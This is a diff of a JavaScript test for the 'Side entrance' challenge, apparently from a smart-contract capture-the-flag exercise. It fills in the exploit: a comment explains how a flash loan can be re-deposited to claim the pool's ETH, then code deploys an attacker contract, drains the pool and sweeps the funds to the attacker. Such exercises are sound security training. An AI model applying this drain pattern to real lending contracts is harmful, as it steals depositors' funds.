@@ -24,7 +24,19 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            The contract enables its user to deposit the ETH loaned, effectively transferring any fund deposited by the other users into an attacker's owned contract.
+            The contract can then be emptied to retrieve the ETH.
+        */
+        const AttackerContractFactory = await ethers.getContractFactory('SideEntranceExploit', attacker);
+        this.attackerContract = await AttackerContractFactory.deploy(attacker.address, this.pool.address);
+        await this.attackerContract.exploit(ETHER_IN_POOL);
+
+        expect(
+            await ethers.provider.getBalance(this.attackerContract.address)
+        ).to.equal(ETHER_IN_POOL); // Attacker's contract should be full with the pool balance
+
+        this.attackerContract.sweep(); // Transfer the ETH to attacker's wallet
     });
 
     after(async function () {
